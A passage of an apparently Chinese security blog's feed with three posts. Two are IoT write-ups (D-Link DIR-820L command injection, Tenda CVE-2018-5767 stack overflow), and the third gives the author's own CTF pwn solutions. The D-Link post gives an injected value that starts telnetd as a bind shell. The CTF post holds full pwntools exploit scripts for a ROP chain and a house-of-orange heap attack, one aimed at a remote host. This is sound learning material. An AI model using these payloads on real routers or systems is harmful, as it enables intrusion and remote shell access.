    <published>2023-09-23T07:21:25.000Z</published>
    <updated>2023-09-23T15:29:37.253Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设备型号:D-Link DIR-820L<br>固件下载地址:<a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663">http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接直接选择使用Firmae进行模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin</span><br></pre></td></tr></table></figure><p>第一次使用Firmae可能需要等的比较久 我等了二十分钟左右<br>出现下图中的样子就是启动成功了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据提供的描述 可以得知漏洞出现在lan.asp中的device_name</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp.</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" alt="image.png"></a><br>可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" alt="image.png"></a><br>朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp<br>在squashfs-root文件夹中查询一下这个字符串<br>没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" alt="image.png"></a><br>这里复制了这篇文章的描述: <a href="https://www.wangan.com/p/11v772975e2a5820">https://www.wangan.com/p/11v772975e2a5820</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。</span><br><span class="line"></span><br><span class="line">◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。</span><br><span class="line"></span><br><span class="line">◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。</span><br><span class="line"></span><br><span class="line">◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。</span><br></pre></td></tr></table></figure><p>所以这里我们选择ncc2这个程序 ida打开<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" alt="image.png"></a><br>调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容<br>查找一下这个函数是在哪个动态库声明的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" alt="image.png"></a><br>最后成功找到了过滤的字符串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" alt="image.png"></a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接在管理界面修改device_name 随后点击保存 利用burp抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" alt="image.png"></a><br>可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a</span><br></pre></td></tr></table></figure><p>%0a用来绕过字符判断<br>在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了<br>可惜我自己试了半天都没有复现成功 不过学习个思路就行了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>cve-2018-5767</title>
    <link href="http://example.com/2023/09/15/cve-2018-5767/"/>
    <id>http://example.com/2023/09/15/cve-2018-5767/</id>
    <published>2023-09-15T03:03:19.000Z</published>
    <updated>2023-09-17T07:45:19.463Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习<br>固件下载地址 <a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1</a></p><h1 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h1><p>使用binwalk提取出固件的文件系统<br>随后使用readelf查看一下固件的架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" alt="image.png"></a><br>可以看到是32位的ARM架构<br>接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" alt="image.png"></a><br>我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp /usr/bin/qemu-arm-static .</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" alt="image.png"></a><br>但是你会发现此时程序卡在了这里<br>先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置<br>可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" alt="image.png"></a><br>将断点打在这个puts函数 我们看看v18的值是怎么赋值的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">b *0x2CF7C</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>可以看到此时的死循环和R3寄存器的值有关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" alt="image.png"></a><br>我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环<br>但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" alt="image.png"></a><br>还是老办法 定位到对应的字符串<br>代码审计可以发现是这个if判断的锅<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" alt="image.png"></a><br>我们需要进入这个if分支 才能正常使用程序<br>则使得r3不为0即可<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" alt="image.png"></a><br>随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo ifconfig br0 192.168.xx.xx</span><br></pre></td></tr></table></figure><p>随后我们再次运行httpd程序 可以发现成功获取到了ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" alt="image.png"></a><br>暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了<br>但是还是发现无法正常访问网页<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/`</span><br></pre></td></tr></table></figure><p>把目录复制一下就行了 原理暂时还没搞懂<br>这个师傅的文章看到的 <a href="https://cn-sec.com/archives/1727127.html">https://cn-sec.com/archives/1727127.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过官方给出的分析<br><a href="https://fidusinfosec.com/remote-code-execution-cve-2018-5767/">https://fidusinfosec.com/remote-code-execution-cve-2018-5767/</a><br>可以知道漏洞点位于R7WebsSecurityHandler函数中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" alt="image.png"></a><br>调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX<br>所以可以进行一个栈溢出的rop链利用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" alt="image.png"></a><br>看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" alt="image.png"></a><br>随后可以看到程序终止了 报段错误<br>于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" alt="image.png"></a><br>可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖<br>而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误<br>通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" alt="image.png"></a><br>在if分支中有一个函数涉及到了该地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" alt="image.png"></a><br>所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链<br>绕过if分支的条件则是在’.’后跟上这些后缀名<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" alt="image.png"></a><br>随后就是简单的栈溢出 直接打system就行了<br>但是 由于我的vmmap不知道为啥获取不到对应的libc地址<br>所以复现失败</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>Sictf_round2出题小记</title>
    <link href="http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-09-11T04:43:02.000Z</published>
    <updated>2023-09-14T17:21:11.120Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>被非预期打穿了呜呜呜  应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值</p><p>原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.0.104&quot;,32770)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!!!&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0x404040</span></span><br><span class="line">write_addr = <span class="number">0x4011E2</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0xa00</span>)</span><br><span class="line">ptr_addr = <span class="number">0x4011F1</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(leak_addr+<span class="number">0x20</span>+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(bss_addr)+p64(write_addr)+cyclic(<span class="number">0x10</span>)+p64(leak_addr+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a780</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>house of orange 不过对泄露堆地址的步骤改了改</p><p>没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了</p><p>然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;210.44.151.51&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xfc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5131</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040E0</span>+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x22010</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x22010</span>)+p64(heap_addr+<span class="number">0x90</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">main_arena = libc_addr + <span class="number">0x3c4b20</span>+<span class="number">88</span></span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x1a8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># debug()</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
</feed>
